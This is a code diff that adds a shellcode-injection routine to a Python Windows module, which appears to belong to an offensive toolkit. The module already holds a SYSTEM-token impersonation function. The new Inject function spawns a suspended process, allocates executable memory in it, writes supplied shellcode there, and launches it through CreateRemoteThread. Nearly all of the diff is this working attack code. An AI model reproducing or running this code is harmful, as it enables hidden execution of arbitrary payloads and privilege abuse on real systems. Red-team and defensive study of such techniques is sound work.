@@ -21,10 +21,16 @@ import tempfile
 import threading
 import time 
 import ctypes
+import win32process
 import win32api, win32security
 from pathlib import Path
 from typing import Iterable, Optional, Union
 from ctypes import byref, windll, wintypes
+from ctypes.wintypes import BOOL
+from ctypes.wintypes import DWORD
+from ctypes.wintypes import HANDLE
+from ctypes.wintypes import LPVOID
+from ctypes.wintypes import LPCVOID
 
 
     
@@ -138,6 +144,20 @@ class PROCESSENTRY32(ctypes.Structure):
         ('dwFlags',             DWORD),
         ('szExeFile',           TCHAR * MAX_PATH)
     ]
+    
+LPCSTR = LPCTSTR = ctypes.c_char_p
+LPDWORD = PDWORD = ctypes.POINTER(DWORD)
+
+
+class _SECURITY_ATTRIBUTES(ctypes.Structure):
+    _fields_ = [('nLength', DWORD),
+                ('lpSecurityDescriptor', LPVOID),
+                ('bInheritHandle', BOOL), ]
+
+
+SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
+LPSECURITY_ATTRIBUTES = ctypes.POINTER(_SECURITY_ATTRIBUTES)
+LPTHREAD_START_ROUTINE = LPVOID
 
 OS_MAPPING = {WINDOWS: [], MACOS: [], LINUX: []}
 
@@ -741,3 +761,38 @@ def impersonate_system():
         win32api.CloseHandle(hp)
      except Exception as e:
             print('[x] - Failed To Impersonate System Token via Winlogon')
+            
+            
+def Inject(path, shellcode):
+    # created suspended process
+    info = win32process.CreateProcess(None, path, None, None, False, 0x04, None, None, win32process.STARTUPINFO())
+    page_rwx_value = 0x40
+    process_all = 0x1F0FFF
+    memcommit = 0x00001000
+    if info[0].handle > 0 :
+       print('[+] - Created ', path, 'Suspended')
+    shellcode_length = len(shellcode)
+    process_handle = info[0].handle  # phandle
+    VirtualAllocEx = windll.kernel32.VirtualAllocEx
+    VirtualAllocEx.restype = LPVOID
+    VirtualAllocEx.argtypes = (HANDLE, LPVOID, DWORD, DWORD, DWORD)
+
+    WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory
+    WriteProcessMemory.restype = BOOL
+    WriteProcessMemory.argtypes = (HANDLE, LPVOID, LPCVOID, DWORD, DWORD)
+    CreateRemoteThread = ctypes.windll.kernel32.CreateRemoteThread
+    CreateRemoteThread.restype = HANDLE
+    CreateRemoteThread.argtypes = (HANDLE, LPSECURITY_ATTRIBUTES, DWORD, LPTHREAD_START_ROUTINE, LPVOID, DWORD, DWORD)
+
+    # allocate RWX memory
+    lpBuffer = VirtualAllocEx(process_handle, 0, shellcode_length, memcommit, page_rwx_value)
+    print('[+] - Allocated remote memory at ', hex(lpBuffer))
+
+    # write shellcode in allocated memory
+    res = WriteProcessMemory(process_handle, lpBuffer, shellcode, shellcode_length, 0)
+    if res > 0 :
+        print('[+] - Shellcode written.')
+
+    # create remote thread to start shellcode execution
+    CreateRemoteThread(process_handle, None, 0, lpBuffer, 0, 0, 0)
+    print('[+] - Shellcode Injection, done.')
